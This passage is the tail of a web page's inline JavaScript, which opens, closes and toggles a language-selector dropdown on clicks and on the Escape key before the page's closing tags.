                closeDropdown();
            }

            function openDropdown() {
                langDropdown.classList.add('open');
                langArrow.classList.add('open');
            }

            function closeDropdown() {
                langDropdown.classList.remove('open');
                langArrow.classList.remove('open');
            }

            function toggleLangDropdown(e) {
                e.stopPropagation();
                if (langDropdown.classList.contains('open')) {
                    closeDropdown();
                } else {
                    openDropdown();
                }
            }
            langSelector.addEventListener('click', toggleLangDropdown);
            document.addEventListener('click', function(e) {
                if (!langSelector.contains(e.target)) {
                    closeDropdown();
                }
            });
            buildLanguageDropdown();
            currentLangLabel.textContent = currentLabel;
            document.addEventListener('keydown', function(e) {
                if (e.key === 'Escape') {
                    closeDropdown();
                }
            });
        })();
    </script>
</body>
</html>
